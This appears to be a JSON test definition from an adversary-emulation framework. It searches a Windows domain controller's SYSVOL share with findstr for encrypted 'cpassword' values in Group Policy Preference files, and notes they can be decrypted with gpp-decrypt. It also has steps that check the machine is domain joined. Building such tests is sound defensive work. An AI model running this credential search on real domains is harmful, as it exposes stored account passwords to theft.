{
  "id": "870fe8fb-5e23-4f5f-b89d-dd7fe26f3b5f",
  "name": "GPP Passwords (findstr)",
  "description": "Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt on Kali Linux.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "e63e17fe-71cf-42a1-931c-57d7b363d5f5",
      "type": "execute-command",
      "data": {
        "command": "findstr /S cpassword %logonserver%\\sysvol\\*.xml\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "c35b5b48-6dd8-451a-9f53-412c8a96c38c",
      "name": "Check dependency 1/1",
      "description": "Computer must be domain joined\n",
      "type": "execute-command",
      "data": {
        "command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "fdc2b682-cf18-4baf-a97c-665c687de42d",
      "name": "Resolve dependency 1/1",
      "description": "Computer must be domain joined\n",
      "type": "execute-command",
      "data": {
        "command": "Write-Host Joining this computer to a domain must be done manually\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "8f992286-c499-4889-a013-e46b0a08bcca",
      "name": "Re-check dependency 1/1",
      "description": "Computer must be domain joined\n",
      "type": "execute-command",
      "data": {
        "command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "c35b5b48-6dd8-451a-9f53-412c8a96c38c",
      "p": "on-success",
      "o": "e63e17fe-71cf-42a1-931c-57d7b363d5f5"
    },
    {
      "s": "c35b5b48-6dd8-451a-9f53-412c8a96c38c",
      "p": "on-failure",
      "o": "fdc2b682-cf18-4baf-a97c-665c687de42d"
    },
    {
      "s": "fdc2b682-cf18-4baf-a97c-665c687de42d",
      "p": "on-success",
      "o": "8f992286-c499-4889-a013-e46b0a08bcca"
    },
    {
